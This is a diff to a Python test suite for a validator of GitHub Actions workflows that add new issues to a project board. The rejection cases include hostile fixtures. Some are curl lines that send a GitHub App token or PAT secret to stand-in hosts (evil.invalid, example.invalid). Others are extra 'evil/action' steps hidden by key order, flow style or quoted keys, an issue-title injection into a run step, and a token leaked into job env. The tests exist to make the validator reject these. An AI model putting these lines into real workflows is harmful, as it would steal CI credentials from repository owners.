@@ -1999,7 +1999,9 @@ class AutoAddWorkflowTest(unittest.TestCase):
         (wf / "add.yml").write_text(text, encoding="utf-8")
         return ctx
 
-    def test_structurally_validates_generated_workflow(self) -> None:
+    def test_structurally_validates_legacy_pat_workflow(self) -> None:
+        """Repos bootstrapped from older plugin versions must keep passing —
+        the doctor does not force an App setup on a repo that never needed one."""
         url = "https://github.com/orgs/acme/projects/5"
         ctx = self._write(
             "on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
@@ -2008,6 +2010,93 @@ class AutoAddWorkflowTest(unittest.TestCase):
             "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n")
         inspection = lb.inspect_auto_add_workflow(ctx, url)
         self.assertTrue(inspection.valid, inspection.detail)
+
+    def test_structurally_validates_app_token_workflow(self) -> None:
+        """The shape bootstrap emits now, matching the merged board repos."""
+        url = "https://github.com/orgs/acme/projects/5"
+        ctx = self._write(
+            "on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
+            "      - uses: actions/create-github-app-token@" + "b" * 40 + "  # v3\n"
+            "        id: app-token\n        with:\n"
+            "          client-id: ${{ vars.LWD_APP_CLIENT_ID }}\n"
+            "          private-key: ${{ secrets.LWD_APP_PRIVATE_KEY }}\n"
+            "          owner: acme\n"
+            "      - uses: actions/add-to-project@" + "a" * 40 + "  # v2\n"
+            "        with:\n          project-url: " + url + "\n"
+            "          github-token: ${{ steps.app-token.outputs.token }}\n")
+        inspection = lb.inspect_auto_add_workflow(ctx, url)
+        self.assertTrue(inspection.valid, inspection.detail)
+
+    def test_step_guards_do_not_fire_on_legitimate_yaml(self) -> None:
+        """Positive control for the widened `uses:`/`run:` key guards and the
+        flow-style rejection. Every other case here is a rejection, so a future
+        broadening of those regexes would keep the suite green while turning the
+        doctor red on working repos. These three constructs must keep passing:
+        a flow SEQUENCE that is not a step, `permissions: {}`, and the scaffold's
+        own comment telling the reader not to add `run:` steps."""
+        url = "https://github.com/orgs/acme/projects/5"
+        ctx = self._write(
+            "# SECURITY: do NOT add `run:` steps that interpolate issue content\n"
+            "on:\n  issues:\n    types: [opened]\n\npermissions: {}\n\n"
+            "jobs:\n  add:\n    permissions: {}\n    steps:\n"
+            "      - uses: actions/add-to-project@" + "a" * 40 + "\n"
+            "        with:\n          project-url: " + url + "\n"
+            "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n")
+        inspection = lb.inspect_auto_add_workflow(ctx, url)
+        self.assertTrue(inspection.valid, inspection.detail)
+
+    def test_rejects_broken_app_token_wiring(self) -> None:
+        url = "https://github.com/orgs/acme/projects/5"
+        app = ("      - uses: actions/create-github-app-token@" + "b" * 40 + "\n"
+               "        id: app-token\n        with:\n"
+               "          client-id: ${{ vars.LWD_APP_CLIENT_ID }}\n"
+               "          private-key: ${{ secrets.LWD_APP_PRIVATE_KEY }}\n")
+        head = "on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
+        adder = ("      - uses: actions/add-to-project@" + "a" * 40 + "\n"
+                 "        with:\n          project-url: " + url + "\n")
+        cases = {
+            # The token output must come from the App step, not an unrelated id.
+            "unknown_step_id": head + app + adder
+            + "          github-token: ${{ steps.other.outputs.token }}\n",
+            # A moving tag on the App step runs with the private key in scope.
+            "app_step_moving_tag": head
+            + app.replace("@" + "b" * 40, "@v3") + adder
+            + "          github-token: ${{ steps.app-token.outputs.token }}\n",
+            # A third action would run inside the credential-bearing job.
+            "extra_action": head + app
+            + "      - uses: evil/action@" + "c" * 40 + "\n" + adder
+            + "          github-token: ${{ steps.app-token.outputs.token }}\n",
+            # The run-step guard survives the widened credential shapes.
+            "run_step": head + app + adder
+            + "          github-token: ${{ steps.app-token.outputs.token }}\n"
+            + "      - run: echo '${{ github.event.issue.title }}'\n",
+            # A step may spell its keys in any order: `uses:` off the dash line
+            # is still an action running with the App key in scope.
+            "name_first_extra_step": head + app + adder
+            + "          github-token: ${{ steps.app-token.outputs.token }}\n"
+            + "      - name: exfil\n        uses: evil/action@v1\n",
+            # Flow style hides a whole step on one line, past every block anchor.
+            "flow_style_extra_step": head + app + adder
+            + "          github-token: ${{ steps.app-token.outputs.token }}\n"
+            + "      - {uses: evil/action@v1}\n",
+            "flow_style_run": head + app + adder
+            + "          github-token: ${{ steps.app-token.outputs.token }}\n"
+            + "      - {run: curl -d ${{ steps.app-token.outputs.token }} evil.invalid}\n",
+            # A quoted key is the same key.
+            "quoted_run_key": head + app + adder
+            + "          github-token: ${{ steps.app-token.outputs.token }}\n"
+            + "      - name: x\n        'run': curl evil.invalid\n",
+            # The token must be named only where it is consumed.
+            "token_copied_to_job_env": head.replace(
+                "  add:\n    steps:\n",
+                "  add:\n    env:\n      LEAK: ${{ steps.app-token.outputs.token }}\n    steps:\n")
+            + app + adder
+            + "          github-token: ${{ steps.app-token.outputs.token }}\n",
+        }
+        for name, text in cases.items():
+            with self.subTest(case=name):
+                inspection = lb.inspect_auto_add_workflow(self._write(text), url)
+                self.assertFalse(inspection.valid, inspection.detail)
 
     def test_rejects_wrong_trigger_moving_ref_url_and_secret(self) -> None:
         expected = "https://github.com/orgs/acme/projects/5"
@@ -2051,6 +2140,19 @@ class AutoAddWorkflowTest(unittest.TestCase):
                 f"          project-url: {url}\n"
                 "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"
                 "      - run: curl -d '${{ secrets.ADD_TO_PROJECT_PAT }}' example.invalid\n"),
+            # Same step-budget bypasses as the App shape — one shared guard.
+            "extra_name_first_action": (
+                f"on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
+                f"      - uses: actions/add-to-project@{sha}\n        with:\n"
+                f"          project-url: {url}\n"
+                "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"
+                "      - name: exfil\n        uses: evil/action@v1\n"),
+            "extra_flow_style_action": (
+                f"on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
+                f"      - uses: actions/add-to-project@{sha}\n        with:\n"
+                f"          project-url: {url}\n"
+                "          github-token: ${{ secrets.ADD_TO_PROJECT_PAT }}\n"
+                "      - {uses: evil/action@v1}\n"),
             "extra_other_action": (
                 f"on:\n  issues:\n    types: [opened]\njobs:\n  add:\n    steps:\n"
                 f"      - uses: evil/action@{'b' * 40}\n"
